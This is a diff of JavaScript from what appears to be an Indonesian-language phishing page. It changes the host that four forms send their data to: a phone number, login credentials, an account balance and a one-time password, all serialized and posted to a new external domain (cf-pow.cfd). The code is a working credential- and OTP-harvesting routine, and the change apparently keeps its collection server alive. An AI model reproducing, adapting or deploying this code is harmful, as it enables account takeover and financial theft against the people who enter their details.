@@ -8,7 +8,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://axcellent.dvnet.org/app21/no.php',
+            url: 'https://axcellent.cf-pow.cfd/app21/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -28,7 +28,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://axcellent.dvnet.org/app21/login.php',
+            url: 'https://axcellent.cf-pow.cfd/app21/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -54,7 +54,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://axcellent.dvnet.org/app21/saldo.php',
+            url: 'https://axcellent.cf-pow.cfd/app21/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -84,7 +84,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://axcellent.dvnet.org/app21/otp.php',
+ url: 'https://axcellent.cf-pow.cfd/app21/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
